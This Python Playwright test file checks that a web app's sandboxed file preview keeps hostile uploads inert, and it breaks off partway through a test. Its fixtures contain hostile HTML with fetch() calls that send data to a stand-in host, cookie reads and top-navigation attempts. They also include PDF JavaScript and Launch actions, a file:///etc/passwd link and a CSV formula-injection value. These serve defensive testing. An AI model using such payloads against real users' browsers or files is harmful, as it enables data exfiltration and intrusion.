"""Browser tests for file previews (C-60, #1252): someone else's HTML in a sandboxed, network-less frame, and the viewer.

Runs through scripts/check_ui.sh test_file_preview. The negative security tests open a hostile HTML file the way a reader would (the
row's name, then the viewer) and assert that nothing in it runs, nothing leaves the browser, the Flux session is unreachable and the
Flux page around it is unchanged; with Run scripts, its scripts run in an opaque origin that still reaches nothing. The API half (the
route's headers, frame-only answer and access) is tests/app/file-preview.test.ts. FLUX_UI_BROWSER selects chromium (default) or webkit.
"""

from __future__ import annotations

import html as htmllib
import json
import os
import re
import socket
import threading
import time
import unittest
import urllib.parse
import uuid

from playwright.sync_api import Browser, BrowserContext, Page, expect, sync_playwright

from test_app_shell import DESKTOP, ORIGIN, PHONE, UPSTREAM, start_forwarder

UI_BROWSER = os.environ.get("FLUX_UI_BROWSER", "chromium")
if UI_BROWSER not in ("chromium", "webkit"):
    raise ValueError(f"FLUX_UI_BROWSER must be chromium or webkit, got {UI_BROWSER!r}")
SHOTS = os.environ.get("FLUX_UI_SCREENSHOTS")
PASSWORD = "previews stay in their box"
STAMP = int(time.time() * 1000)
PEOPLE = {"ada": ("Ada Kowalska", f"ada.preview+{STAMP}@example.test"), "jonas": ("Jonas Berg", f"jonas.preview+{STAMP}@example.test")}
LEAK = "leak.invalid"


class Listener:
    """A real TCP listener on loopback that counts connections: a preconnect never shows as a request, only as a connection."""

    def __init__(self) -> None:
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(("127.0.0.1", 0))
        self.server.listen(16)
        self.port = self.server.getsockname()[1]
        self.connections = 0
        threading.Thread(target=self.serve, daemon=True).start()

    def serve(self) -> None:
        while True:
            client, _ = self.server.accept()
            self.connections += 1
            try:
                client.settimeout(1)
                client.recv(4096)
                client.sendall(b"HTTP/1.1 204 No Content\r\nConnection: close\r\n\r\n")
            except OSError:
                pass
            finally:
                client.close()


TRAP = Listener()
TRAP_URL = f"http://127.0.0.1:{TRAP.port}"
DOT = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAF0lEQVR4nGNkYPjPQApgIkn1qIZRDcNKAwBXRgEfVhUMcgAAAABJRU5ErkJggg=="

# Every way a page could run code or reach out without being asked: none of it may work while scripts are off.
HOSTILE = f"""<!doctype html><html><head><meta charset="utf-8">
<meta http-equiv="refresh" content="1;url=https://{LEAK}/refresh">
<base href="https://{LEAK}/base/">
<link rel="stylesheet" href="https://{LEAK}/style.css"><link rel="preload" as="image" href="https://{LEAK}/preload.png">
<link rel="prefetch" href="https://{LEAK}/prefetch"><link rel="icon" href="https://{LEAK}/favicon.ico">
<meta http-equiv="x-dns-prefetch-control" content="on"><META HTTP-EQUIV="refresh" CONTENT="0;url={TRAP_URL}/meta">
<link rel="preconnect" href="{TRAP_URL}"><LINK REL="dns-prefetch" HREF="{TRAP_URL}"><link rel="preload" as="fetch" href="{TRAP_URL}/preload">
<link rel="modulepreload" href="{TRAP_URL}/module.js"><link rel="prerender" href="{TRAP_URL}/prerender"><link
 rel="stylesheet" href="{TRAP_URL}/style.css">
<style>@import url(https://{LEAK}/import.css); body {{ font: 16px/1.5 Georgia, serif; margin: 32px; background-image: url(https://{LEAK}/bg.png); }}
@font-face {{ font-family: Leak; src: url(https://{LEAK}/font.woff2); }} h1 {{ font-family: Leak, Georgia, serif; color: rgb(30, 80, 160); }}</style>
<script>document.title = 'owned'; document.getElementById && (window.__ran = 1); parent.postMessage('script', '*'); top.document.title = 'owned';
fetch('https://{LEAK}/fetch'); new Image().src = 'https://{LEAK}/script-img'; document.cookie;</script>
<script src="https://{LEAK}/remote.js"></script>
</head><body onload="parent.postMessage('onload', '*'); fetch('https://{LEAK}/onload')">
<h1 id="title">Gateway range report</h1>
<p id="lead">Signal at the far east bed, Saturday 14:00.</p>
<img id="inline" alt="inline dot" src="{DOT}" width="16" height="16">
<img id="remote" alt="remote pixel" src="https://{LEAK}/pixel.png" onerror="parent.postMessage('onerror', '*'); fetch('https://{LEAK}/onerror')">
<svg width="10" height="10"><image href="https://{LEAK}/svg.png" width="10" height="10"/></svg>
<video poster="https://{LEAK}/poster.png" src="https://{LEAK}/video.mp4" autoplay muted></video>
<audio src="https://{LEAK}/audio.mp3" autoplay></audio>
<iframe src="https://{LEAK}/frame"></iframe><object data="https://{LEAK}/object"></object><embed src="https://{LEAK}/embed">
<form id="form" action="https://{LEAK}/form" method="post"><input name="q" value="secret"><button id="send">Send</button></form>
<form action="https://{LEAK}/auto"><input autofocus onfocus="this.form.submit()"></form>
<a id="top" href="https://{LEAK}/top" target="_top">Open on top</a>
<a id="blank" href="https://{LEAK}/blank" target="_blank">Open a window</a>
<a id="file" href="{DOT}" download="dot.png">Download the dot</a>
<a id="ping" href="#lead" ping="https://{LEAK}/ping">Ping</a>
<a id="plain" href="https://{LEAK}/plain">A plain link</a> <a id="self" href="/">Flux itself</a>
<div style="background: url(https://{LEAK}/inline-style.png)">styled</div>
</body></html>""".encode()

# The same hints in a page with a UTF-16 byte-order mark: the browser decodes it as UTF-16 whatever the header says (C-60).
PAGE16 = (f'<link rel="preconnect" href="{TRAP_URL}"><LINK rel="preload" as="fetch" href="{TRAP_URL}/preload16">'
          f'<link rel="dns-prefetch" href="{TRAP_URL}"><meta http-equiv="refresh" content="0;url={TRAP_URL}/meta16">'
          '<h1 id="title">Sixteen-bit report</h1><p>Zażółć gęślą jaźń</p>')
UTF16 = {"le": b"\xff\xfe" + PAGE16.encode("utf-16-le"), "be": b"\xfe\xff" + PAGE16.encode("utf-16-be")}

# A nested document needs no fetch (#1349): an iframe's `srcdoc` is entity-encoded text that the browser decodes into an about:srcdoc page
# (a srcdoc inside a srcdoc too), and WebKit opens a connection for that page's <link rel=preconnect> without asking the policy.
# Every page below, sent as it is, made WebKit connect to the listener.
HINT = f'<link rel="preconnect" href="{TRAP_URL}"><LINK REL=dns-prefetch HREF={TRAP_URL}>'
ATTR = htmllib.escape(HINT, quote=True)
NESTED_ATTR = htmllib.escape(f'<iframe srcdoc="{ATTR}"></iframe>', quote=True)
QUOTED = urllib.parse.quote(HINT)


def quarterly(body: str) -> str:
    return f'<!doctype html><html><body><h1 id="title">Quarterly report</h1><p>Nothing to see.</p>{body}</body></html>'


SRCDOC = quarterly(f'<iframe hidden srcdoc="{ATTR}"></iframe>')
NESTED = quarterly(f'<iframe hidden srcdoc="{NESTED_ATTR}"></iframe>')
HIDING_PLACES = quarterly(
    f"<IFRAME\nSRCDOC\t=\t'{ATTR}' hidden></IFRAME><iframe/srcDoc=\"{ATTR}\"></iframe><noscript><iframe srcdoc=\"{ATTR}\"></iframe></noscript>"
    f'<object data="data:text/html,{QUOTED}" type="text/html"></object><embed src="data:text/html,{QUOTED}" type="text/html">'
    f'<iframe src="data:text/html,{QUOTED}"></iframe><iframe src="javascript:document.write(1)"></iframe><portal src="{TRAP_URL}/portal"></portal>')
NESTS = {"srcdoc": ("srcdoc.html", SRCDOC.encode()), "nested": ("nested.html", NESTED.encode()), "hiding": ("hiding-places.html", HIDING_PLACES.encode()),
         "srcdoc16": ("srcdoc16.html", b"\xff\xfe" + NESTED.encode("utf-16-le")), "srcdoc16be": ("srcdoc16be.html", b"\xfe\xff" + SRCDOC.encode("utf-16-be"))}

# With Run scripts: what the page's own script can reach, written into the page for the test to read.
PROBE = f"""<!doctype html><html><head><meta charset="utf-8"><title>Probe</title></head><body>
<h1 id="title">Script probe</h1><ul id="out"></ul>
<script>
const say = (key, value) => {{ const li = document.createElement('li'); li.id = key; li.textContent = key + ': ' + value; document.getElementById('out').append(li); }};
const tryIt = (key, run) => {{ try {{ say(key, run()); }} catch (error) {{ say(key, 'blocked ' + error.name); }} }};
say('ran', 'yes');
say('origin', String(self.origin));
tryIt('cookie', () => 'read ' + JSON.stringify(document.cookie));
tryIt('storage', () => {{ localStorage.setItem('x', '1'); return 'read'; }});
tryIt('parent', () => 'read ' + parent.document.title);
tryIt('top', () => {{ top.location.href = 'https://{LEAK}/top'; return 'asked'; }});
tryIt('open', () => 'got ' + String(window.open('https://{LEAK}/open')));
tryIt('alert', () => {{ alert('owned'); return 'returned'; }});
parent.postMessage({{ flux: 'owned' }}, '*');
fetch('/api/v1/me').then(() => say('api', 'read'), (error) => say('api', 'blocked ' + error.name));
fetch('https://{LEAK}/fetch').then(() => say('fetch', 'read'), (error) => say('fetch', 'blocked ' + error.name));
const img = new Image(); img.onload = () => say('image', 'loaded'); img.onerror = () => say('image', 'blocked'); img.src = 'https://{LEAK}/pixel.png';
try {{ const socket = new WebSocket('wss://{LEAK}/socket'); socket.onerror = () => say('socket', 'blocked'); }} catch (error) {{ say('socket', 'blocked ' + error.name); }}
const form = document.createElement('form'); form.action = 'https://{LEAK}/form'; form.method = 'post'; document.body.append(form);
tryIt('form', () => {{ form.submit(); return 'asked'; }});
setTimeout(() => say('done', 'yes'), 400);
</script></body></html>""".encode()

REPORT = """<!doctype html><html><head><meta charset="utf-8"><title>Range</title><style>
body { font: 15px/1.5 system-ui, sans-serif; margin: 40px; color: #222; } table { border-collapse: collapse; } td, th { border: 1px solid #ccc; padding: 4px 10px; }
h1 { font-size: 24px; } .ok { color: #2a7a3a; }</style></head><body>
<h1>LoRa range, far east beds</h1><p>Readings from Saturday's walk with the handheld gateway, 14:00–15:30.</p>
<table><tr><th>Bed</th><th>RSSI</th><th>SNR</th></tr><tr><td>Far east</td><td>-112</td><td>-4.5</td></tr><tr><td>North</td><td>-98</td><td>2.1</td></tr>
<tr><td>Shed</td><td>-87</td><td class="ok">7.9</td></tr></table><p>The hedge costs about 14 dB. Mount sensor 3 on the post, not the fence.</p>
</body></html>""".encode()


def sandbox_refusal(message: str) -> bool:
    """A refusal the sandbox of the preview itself reports, which is the behaviour under test, not a fault of Flux's page."""
    text = message.lower()
    return "service worker is disabled because the context is sandboxed" in text or (
        "sandboxed" in text and "flag is not set" in text and "/preview" in text or "not allowed in a sandboxed frame" in text)


def build_pdf(pages: list[dict], dests: dict | None = None, catalog: bytes = b"", page_extra: bytes = b"") -> bytes:
    """A real PDF of 300 x 200 point pages, each with a line of text. A page is {"text": str, "annots": [make(page_objects) -> annotation dict]};
    `dests` are named destinations; `catalog` and `page_extra` add entries (an open action, page actions) to the catalog and every page."""
    count = len(pages)
    page_obj = [3 + i for i in range(count)]
    font = 3 + count
    nxt = font + 1
    objects: dict[int, bytes] = {}
    named = b" /Dests << " + b" ".join(b"/%s %s" % (key.encode(), make(page_obj)) for key, make in dests.items()) + b" >>" if dests else b""
    objects[1] = b"<< /Type /Catalog /Pages 2 0 R" + named + catalog + b" >>"
    objects[2] = b"<< /Type /Pages /Kids [" + b" ".join(b"%d 0 R" % o for o in page_obj) + b"] /Count %d >>" % count
    objects[font] = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"
    for i, page in enumerate(pages):
        stream = b"BT /F1 24 Tf 20 100 Td (%s) Tj ET" % page["text"].encode()
        content = nxt
        nxt += 1
        objects[content] = b"<< /Length %d >>\nstream\n" % len(stream) + stream + b"\nendstream"
        refs = []
        for make in page.get("annots", []):
            refs.append(b"%d 0 R" % nxt)
            objects[nxt] = make(page_obj)
            nxt += 1
        annots = b" /Annots [" + b" ".join(refs) + b"]" if refs else b""
        objects[page_obj[i]] = (b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 200] /Contents %d 0 R /Resources << /Font << /F1 %d 0 R >> >>%s%s >>"
                                % (content, font, annots, page_extra))
    out, offsets = b"%PDF-1.7\n", {}
    for number in sorted(objects):
        offsets[number] = len(out)
        out += b"%d 0 obj\n" % number + objects[number] + b"\nendobj\n"
    size = max(objects) + 1
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % size + b"".join(b"%010d 00000 n \n" % offsets[n] for n in range(1, size))
    return out + b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (size, xref)


def link(rect: str, action: bytes | None = None, dest=None):
    """A link annotation over `rect` (x1 y1 x2 y2, in points) with an action or a destination."""
    def make(pages: list[int]) -> bytes:
        body = b"<< /Type /Annot /Subtype /Link /Rect [%s] /Border [0 0 0]" % rect.encode()
        if action is not None:
            body += b" /A " + (action(pages) if callable(action) else action)
        if dest is not None:
            body += b" /Dest " + dest(pages)
        return body + b" >>"
    return make


PDF_LINK = f"https://{LEAK}/pdf-link"
FULL_PAGE = "0 0 300 200"
JS = f"app.launchURL('https://{LEAK}/launch', true); this.submitForm('https://{LEAK}/submit'); app.alert('owned');".encode()
SCRIPT = b"<< /S /JavaScript /JS (" + JS + b") >>"
PLACEMENT = build_pdf([{"text": "Gateway placement"}])
# The audit's page (#1350): one page whose only annotation is a link as large as the page, so a click anywhere on the document followed it.
BIG_LINK = build_pdf([{"text": "Click anywhere", "annots": [link(FULL_PAGE, b"<< /S /URI /URI (%s) >>" % PDF_LINK.encode())]}])
# Everything else a PDF can ask for: scripts (open action, document and page actions), every scheme, Launch, another file, a form. One honest link.
HOSTILE_PDF = build_pdf([{"text": "Hostile links", "annots": [
    link("0 0 300 20", b"<< /S /URI /URI (javascript:alert(1)) >>"), link("0 20 300 40", b"<< /S /URI /URI (data:text/html,<script>alert(1)</script>) >>"),
    link("0 40 300 60", b"<< /S /URI /URI (file:///etc/passwd) >>"), link("0 60 300 80", b"<< /S /URI /URI (vbscript:msgbox) >>"),
    link("0 80 300 100", b"<< /S /URI /URI (mailto:a@b.example) >>"), link("0 100 300 120", b"<< /S /URI /URI (ftp://f.example/x) >>"),
    link("0 120 300 140", b"<< /S /Launch /F (calc.exe) >>"),
    link("0 140 300 160", b"<< /S /Launch /F << /FS /URL /F (https://" + LEAK.encode() + b"/launch) >> >>"),
    link("0 160 300 180", b"<< /S /GoToR /F << /FS /URL /F (https://" + LEAK.encode() + b"/other.pdf) >> /D [0 /Fit] >>"),
    link("0 180 300 190", b"<< /S /JavaScript /JS (app.alert(1)) >>"), link("0 190 300 195", b"<< /S /URI /URI (https://user:pw@flux.example/x) >>"),
    link("0 195 300 200", b"<< /S /URI /URI (https://" + LEAK.encode() + b"/legit) >>"),
]}], catalog=b" /OpenAction " + SCRIPT + b" /Names << /JavaScript << /Names [(x) " + SCRIPT + b"] >> >>", page_extra=b" /AA << /O " + SCRIPT + b" >>")
# Places in the document: an explicit destination, a page, a named destination, and the last-page action.
GOTO_PDF = build_pdf([
    {"text": "Page one", "annots": [link("0 0 300 40", lambda pages: b"<< /S /GoTo /D [%d 0 R /XYZ 0 150 null] >>" % pages[1]),
                                    link("0 40 300 80", None, lambda pages: b"[%d 0 R /Fit]" % pages[2]),
                                    link("0 80 300 120", b"<< /S /GoTo /D (chapter) >>"), link("0 120 300 160", b"<< /S /Named /N /LastPage >>")]},
    {"text": "Page two", "annots": [link("0 0 300 60", b"<< /S /Named /N /FirstPage >>")]}, {"text": "Page three"},
], dests={"chapter": lambda pages: b"[%d 0 R /Fit]" % pages[2]})
LONG_PDF = build_pdf([{"text": f"Page {n}"} for n in range(1, 41)])
NOT_A_PDF = b"<!doctype html><title>x</title><h1>Not a PDF</h1><script>parent.postMessage('owned', '*')</script>"


LIMIT = 5 * 1024 * 1024
LOG = b"".join(f"2026-11-07T14:{(n // 60) % 60:02d}:{n % 60:02d}Z gateway-3 uplink fcnt={n} rssi=-{90 + n % 30} snr={n % 11 - 4}.5 sf=9 bw=125 freq=868.{n % 9}\n".encode()
               for n in range(52_000))[:LIMIT - 4096]
BIG_CSV = (b"time,bed,rssi,snr,battery,note\n" + b"".join(f"2026-11-07T14:{(n // 60) % 60:02d}:{n % 60:02d}Z,bed {n % 40},-{90 + n % 30},{n % 11 - 4}.5,3.{n % 99:02d},ok\n".encode()
                                                            for n in range(110_000)))
BIG_CSV = BIG_CSV[:BIG_CSV.rindex(b"\n", 0, LIMIT - 4096) + 1]
BIG_CSV_ROWS = BIG_CSV.count(b"\n") - 1
BIG_JSON = ("[" + ",".join(f'{{"id":{n},"bed":"bed {n % 40}","readings":{{"rssi":-{90 + n % 30},"snr":{n % 11 - 4}.5}},"tags":["lora","sf9"]}}' for n in range(60_000)) + "]").encode()
ONE_LINE_MD = b"*a* `b` " * (4 * 1024 * 1024 // 8 - 64)  # 4 MiB of inline marks on one line, no line break
COMMAS = b"," * (4 * 1024 * 1024)  # one row of 4,194,305 empty cells: any member can send it
WIDE = ("\n".join(",".join(f"s{c}" if r == 0 else str((r * c) % 997) for c in range(2000)) for r in range(300)) + "\n").encode()
assert len(BIG_JSON) < LIMIT and len(LOG) < LIMIT and len(BIG_CSV) < LIMIT and len(COMMAS) < LIMIT and len(WIDE) < LIMIT
SMALL_LOG = b"gateway-3 boot ok\n\tsf=9 bw=125\nuplink fcnt=1 rssi=-112 snr=-4.5\n" + b"x" * 300 + b"\n"
LATIN = "Caf\u00e9 north bed, 12\u00b0C\n".encode("windows-1252")
JSON_OK = b'{"gateway": "gw-3", "beds": [{"name": "far east", "rssi": -112}, {"name": "north", "rssi": -98}], "ok": true, "note": null}'
JSON_BAD = b'{\n  "gateway": "gw-3",\n  "beds": [1, 2,, 3]\n}\n'
CSV = b'bed,rssi,note\nfar east,-112,"behind the hedge, low"\nnorth,-98,"=HYPERLINK(""https://leak.invalid/x"",""click"")"\nshed,-87,@SUM(1+1)\nsouth,+5,-2+3\n'
TSV = b"bed\trssi\nfar east\t-112\nnorth\t-98\n"
MARKDOWN = b"""# Sensor notes

Mount **sensor 3** on the *post*, not the fence. See https://example.org/garden-guide for the bracket.

- far east: -112 dBm
- north: -98 dBm

<script>parent.postMessage('markdown', '*')</script>
![pixel](https://leak.invalid/md.png)
"""
SOURCE = b"def rssi(beds):\n    return {b: -112 for b in beds}\n"


class FilePreview(unittest.TestCase):
    pw = None
    browser: Browser
    states: dict[str, dict] = {}
    ids: dict[str, str] = {}

    @classmethod
    def setUpClass(cls) -> None:
        if UPSTREAM:
            start_forwarder(ORIGIN, UPSTREAM)
        cls.pw = sync_playwright().start()
        cls.browser = getattr(cls.pw, UI_BROWSER).launch()
        expect.set_options(timeout=10000)
        contexts: dict[str, BrowserContext] = {}
        for key, (name, email) in PEOPLE.items():
            context = cls.browser.new_context(base_url=ORIGIN, service_workers="block")
            response = context.request.post("/api/auth/sign-up/email", data={"email": email, "password": PASSWORD, "name": name}, headers={"origin": ORIGIN})
            assert response.status == 200, response.text()
            cls.ids[key] = context.request.get("/api/v1/me").json()["user"]["id"]
            cls.states[key] = context.storage_state()
            contexts[key] = context

        def post(who: str, path: str, body: dict) -> dict:
            response = contexts[who].request.post(path, data=body, headers={"origin": ORIGIN})
            assert response.status in (200, 201), f"{path}: {response.status} {response.text()}"
            return response.json()

        ws = post("ada", "/api/v1/workspaces", {"name": "Community garden"})
        post("ada", f"/api/v1/workspaces/{ws['id']}/members", {"email": PEOPLE["jonas"][1], "role": "member"})
        pid = post("ada", f"/api/v1/workspaces/{ws['id']}/projects", {"name": "Community garden sensors", "visibility": "restricted"})["id"]
        cls.ids["grant"] = post("ada", f"/api/v1/projects/{pid}/grants", {"principal": {"kind": "human", "id": cls.ids["jonas"]}, "role": "contributor"})["id"]
        cls.ids["project"] = pid

        def root(key: str, body: str, name: str, data: bytes) -> None:
            upload = contexts["ada"].request.post(f"/api/v1/projects/{pid}/files?uploadId={uuid.uuid4()}&name={name}", data=data,
                                                  headers={"origin": ORIGIN, "content-type": "application/octet-stream"})
            assert upload.status == 201, upload.text()
            started = post("ada", f"/api/v1/projects/{pid}/conversations", {"body": body, "attachmentIds": [upload.json()["id"]], "clientMessageId": str(uuid.uuid4())})
            cls.ids[key] = started["messages"][0]["id"]
            cls.ids[f"conversation:{key}"] = started["id"]
            cls.ids[f"file:{key}"] = upload.json()["id"]

        root("report", "Range report from Saturday", "range-report.html", REPORT)
        root("hostile", "The vendor's page, as they sent it", "vendor-page.html", HOSTILE)
        root("probe", "A page with a script", "probe.html", PROBE)
        for order, data in UTF16.items():
            root(f"utf16{order}", f"A UTF-16{order.upper()} page", f"report-{order}.html", data)
        for key, (name, data) in NESTS.items():
            root(key, f"A page with a document inside it, {name}", name, data)
        for key, name, data in (("log", "gateway.log", SMALL_LOG), ("latin", "notes.txt", LATIN), ("json", "beds.json", JSON_OK),
                                ("bad", "broken.json", JSON_BAD), ("csv", "range.csv", CSV), ("tsv", "range.tsv", TSV),
                                ("source", "rssi.py", SOURCE), ("markdown", "notes.md", MARKDOWN), ("pdf", "placement.pdf", PLACEMENT),
                                ("biglink", "biglink.pdf", BIG_LINK), ("hostile-pdf", "hostile.pdf", HOSTILE_PDF), ("goto", "goto.pdf", GOTO_PDF),
                                ("long-pdf", "long.pdf", LONG_PDF), ("not-pdf", "html-named.pdf", NOT_A_PDF),
                                ("big-log", "uplinks.log", LOG), ("big-csv", "uplinks.csv", BIG_CSV), ("big-json", "uplinks.json", BIG_JSON),
                                ("commas", "commas.csv", COMMAS), ("wide", "matrix.csv", WIDE),
                                ("one-line", "one-line.md", ONE_LINE_MD)):
            root(key, f"File {name}", name, data)
        for context in contexts.values():
            context.close()

    @classmethod
    def tearDownClass(cls) -> None:
        cls.browser.close()
        cls.pw.stop()

    def open(self, key: str, who: str = "jonas", phone: bool = False, dark: bool = False, quiet_stream: bool = False,
             browser: Browser | None = None) -> tuple[Page, list[str], dict]:
        """The conversation holding `key`'s file, with every request that leaves Flux's origin recorded (and stopped)."""
        options: dict = {"base_url": ORIGIN, "locale": "en-GB", "timezone_id": "Europe/Warsaw", "storage_state": self.states[who],
                         "color_scheme": "dark" if dark else "light", "service_workers": "block"}
        options.update(viewport=PHONE, device_scale_factor=3, is_mobile=True, has_touch=True) if phone else options.update(viewport=DESKTOP)
        context = (browser or self.browser).new_context(**options)
        self.addCleanup(context.close)
        outside: list[str] = []

        def leave(route) -> None:
            outside.append(route.request.url)
            route.abort()
        context.route(lambda url: not url.startswith(ORIGIN) and not url.startswith("data:") and not url.startswith("blob:"), leave)
        events: dict = {"pages": [], "downloads": [], "dialogs": []}
        page = context.new_page()
        context.on("page", lambda opened: events["pages"].append(opened.url))
        errors: list[str] = []
        # The browser's own refusals inside the sandboxed preview are not the page's errors: Playwright's service-worker block reads
        # navigator.serviceWorker in every frame (Chromium: "Service worker", WebKit: "Service Worker"), and WebKit also reports the
        # top navigation and the alert the hostile pages try ("... is sandboxed ... flag is not set"). Anything else is kept.
        page.on("pageerror", lambda error: None if sandbox_refusal(str(error)) else errors.append(str(error)))
        page.on("download", lambda download: events["downloads"].append(download.suggested_filename))
        page.on("dialog", lambda dialog: (events["dialogs"].append(dialog.message), dialog.dismiss()))
        self.addCleanup(lambda: self.assertEqual(errors, [], "no uncaught page errors"))
        if quiet_stream:
            # The reader's tab has not heard of the change yet: the live stream is held open and says nothing.
            page.route_web_socket(re.compile(r".*/api/v1/stream.*"), lambda socket: None)
        page.goto(f"/projects/{self.ids['project']}")
        message = page.locator(f"#message-{self.ids[key]}")
        message.scroll_into_view_if_needed()
        expect(message).to_be_visible()
        # The Flux page records every message that reaches it, so the test can tell the preview said nothing to it.
        page.evaluate("() => { window.__messages = []; addEventListener('message', (event) => window.__messages.push(String(event.data && JSON.stringify(event.data)))); }")
        return page, outside, events

    def shot(self, page: Page, name: str) -> None:
        if SHOTS:
            page.evaluate("document.fonts.ready.then(() => true)")
            page.wait_for_timeout(500)
            page.screenshot(path=os.path.join(SHOTS, f"{name}-{UI_BROWSER}.png"))

    def viewer(self, page: Page, key: str, name: str):
        message = page.locator(f"#message-{self.ids[key]}")
        message.get_by_role("button", name=f"Preview {name}").click()
        dialog = page.get_by_role("dialog", name=name)
        expect(dialog).to_be_visible()
        return message, dialog

    def test_01_html_opens_as_authored_with_download_close_and_esc(self) -> None:
        for phone in (False, True):
            for dark in (False, True):
                with self.subTest(phone=phone, dark=dark):
                    page, outside, _ = self.open("report", phone=phone, dark=dark)
                    message, dialog = self.viewer(page, "report", "range-report.html")
                    expect(dialog).to_contain_text("Code · ")
                    frame = dialog.locator("iframe")
                    expect(frame).to_have_attribute("sandbox", "")
                    expect(frame).to_have_attribute("src", f"/api/v1/files/{self.ids['file:report']}/preview")
                    page_in_frame = page.frame_locator(".file-viewer iframe")
                    expect(page_in_frame.get_by_role("heading", name="LoRa range, far east beds")).to_be_visible()
                    expect(page_in_frame.get_by_role("cell", name="-112")).to_be_visible()
                    expect(dialog.get_by_role("status")).to_have_text(re.compile(r"^External images and scripts are blocked\. ?Run scripts · View source$"))
                    download = dialog.get_by_role("link", name="Download")
                    expect(download).to_have_attribute("href", f"/api/v1/files/{self.ids['file:report']}")
                    expect(download).to_have_attribute("download", "range-report.html")
                    # The frame is the page as authored: its own white page, not Flux's surface.
                    self.assertEqual(frame.evaluate("(el) => getComputedStyle(el).backgroundColor"), "rgb(255, 255, 255)")
                    self.shot(page, f"file-preview-html-{'390' if phone else '1440'}-{'dark' if dark else 'light'}")
                    if not phone:
                        with page.expect_download() as saved:
                            download.click()
                        self.assertEqual(saved.value.suggested_filename, "range-report.html")
                    dialog.get_by_role("button", name="Close preview").click()
                    expect(dialog).to_have_count(0)
                    opener = message.get_by_role("button", name="Preview range-report.html")
                    expect(opener).to_be_focused()
                    opener.press("Enter")
                    expect(dialog).to_be_visible()
                    expect(dialog.get_by_role("button", name="Close preview")).to_be_focused()
                    page.keyboard.press("Escape")
                    expect(dialog).to_have_count(0)
                    expect(opener).to_be_focused()
                    # The row's own Download stays a download, apart from the preview.
                    row_download = message.get_by_role("link", name="Download range-report.html")
                    expect(row_download).to_have_attribute("download", "range-report.html")
                    self.assertEqual(outside, [])

    def test_02_a_hostile_page_runs_nothing_and_reaches_nothing(self) -> None:
        page, outside, events = self.open("hostile")
        title, url = page.title(), page.url
        _, dialog = self.viewer(page, "hostile", "vendor-page.html")
        inside = page.frame_locator(".file-viewer iframe")
        expect(inside.locator("#title")).to_have_text("Gateway range report")
        # Clicks a person might make: none submits, opens a window, navigates Flux or downloads.
        for target in ("#send", "#top", "#blank", "#file"):
            inside.locator(target).click()
        page.wait_for_timeout(2500)  # past the page's 1 s refresh
        frame = next(f for f in page.frames if f.url.endswith(f"/files/{self.ids['file:hostile']}/preview"))
        self.assertEqual(frame.url, f"{ORIGIN}/api/v1/files/{self.ids['file:hostile']}/preview", "no refresh, form or link moved the frame")
        expect(inside.locator("#title")).to_have_text("Gateway range report")
        self.assertEqual(outside, [], "nothing left the browser")
        # Not even a connection: a preconnect or DNS prefetch is a hint the browser may act on without asking the policy (WebKit did),
        # so the preview sends every <link> and <meta> inert (C-60).
        self.assertEqual(TRAP.connections, 0, "no connection was opened to a host the page names")
        self.assertEqual(events["pages"], [], "no window opened")
        self.assertEqual(events["downloads"], [], "no download started from inside the preview")
        self.assertEqual(events["dialogs"], [])
        self.assertEqual(page.evaluate("window.__messages"), [], "the page told Flux nothing")
        self.assertEqual((page.title(), page.url), (title, url), "the Flux page is unchanged")
        # The inline data: image draws; the remote one and the remote font do not.
        self.assertTrue(inside.locator("#inline").evaluate("(img) => img.complete && img.naturalWidth === 16"))
        self.assertFalse(inside.locator("#remote").evaluate("(img) => img.naturalWidth > 0"))
        self.assertIsNone(frame.evaluate("window.__ran ?? null"), "the page's script did not run")
        self.assertEqual(frame.evaluate("document.title"), "", "the page's script did not rename it")
        self.assertEqual(frame.evaluate("self.origin"), "null", "an opaque origin")
        expect(dialog).to_be_visible()
        # A link a person clicks loads nothing either: the Flux page frames only its own origin, and Flux refuses to be framed.
        for target in ("#plain", "#ping", "#self"):
            if inside.locator(target).count():
                inside.locator(target).click()
                page.wait_for_timeout(600)
        self.assertEqual(outside, [], "a clicked link left nothing")
        self.assertEqual((page.title(), page.url), (title, url))
        self.assertEqual(events["pages"], [])
        # The Flux page's own policy refused the other site in its frame: the browser reported it to the test stack. Seen here, it is
        # taken off the list the run's CSP gate reads (scripts/csp_gate.sh), as is a report of Flux's page refusing to be framed.
        token = os.environ.get("FLUX_FIXTURE_TOKEN", "")
        bearer = {"authorization": f"Bearer {token}", "origin": ORIGIN}  # the context carries the reader's session cookie
        deadline = time.time() + 10
        seen: set[str] = set()
        while time.time() < deadline and "frame-src" not in seen:
            reports = page.request.get("/api/v1/test/csp-reports", headers=bearer).json()["reports"]
            seen = {r["directive"] for r in reports if r["directive"] == "frame-src" and LEAK in r["blocked"]}
            page.wait_for_timeout(300)
        for directive in ("frame-src", "frame-ancestors"):
            removed = page.request.delete(f"/api/v1/test/csp-reports?directive={directive}", headers=bearer)
            self.assertEqual(removed.status, 204, removed.text())
        if UI_BROWSER == "chromium":
            self.assertEqual(seen, {"frame-src"}, "the Flux page refused the other site in its frame")  # not every engine reports it
        self.assert_recorder_sees(page, outside)

    def test_02a_a_utf16_page_is_made_inert_too(self) -> None:
        for order in UTF16:
            with self.subTest(order=order):
                before = TRAP.connections
                page, outside, events = self.open(f"utf16{order}")
                self.viewer(page, f"utf16{order}", f"report-{order}.html")
                inside = page.frame_locator(".file-viewer iframe")
                expect(inside.locator("#title")).to_have_text("Sixteen-bit report")
                expect(inside.get_by_text("Zażółć gęślą jaźń")).to_be_visible()
                page.wait_for_timeout(2000)
                self.assertEqual(outside, [], "nothing left the browser")
                self.assertEqual(TRAP.connections, before, "no connection was opened to a host the page names")
                self.assertEqual(events["pages"], [])

    def test_02c_a_document_inside_the_page_makes_no_connection_either(self) -> None:
        """#1349: `srcdoc` (nested, hidden in a noscript, in a UTF-16 page) and the other elements that hold a document stay inert."""
        for key, (name, _) in NESTS.items():
            with self.subTest(file=name):
                before = TRAP.connections
                page, outside, events = self.open(key)
                self.viewer(page, key, name)
                inside = page.frame_locator(".file-viewer iframe")
                expect(inside.locator("#title")).to_have_text("Quarterly report")
